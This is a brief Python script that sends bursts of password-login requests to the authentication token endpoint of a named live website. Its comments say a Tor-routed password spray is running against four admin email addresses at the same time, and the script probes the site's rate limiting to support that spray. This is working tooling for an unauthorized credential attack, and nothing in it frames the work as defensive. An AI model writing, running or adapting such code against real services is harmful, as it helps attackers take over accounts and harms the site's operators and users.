import ssl, json, urllib.request, urllib.error, time

BASE = "https://cdn.onlyfakeai.ru"
KEY = "<publishable-key>"
ctx = ssl.create_default_context()

def try_login(email, password):
    h = {"User-Agent": "Mozilla/5.0", "apikey": KEY,
         "Content-Type": "application/json;charset=UTF-8"}
    body = json.dumps({"email": email, "password": password}).encode()
    r = urllib.request.Request(BASE + "/auth/v1/token?grant_type=password",
                               data=body, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=20, context=ctx) as resp:
            return resp.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0

# while tor spray is hammering the 4 admin emails,
# test MY probe email (never sprayed before) 8x fast.
em = "rat4080sup8q7bdw@gmail.com"
print("probe-email burst during tor spray:")
for i in range(8):
    st = try_login(em, f"burstProbe{i}!")
    print(i, st, time.strftime("%H:%M:%S"))
    time.sleep(1.2)
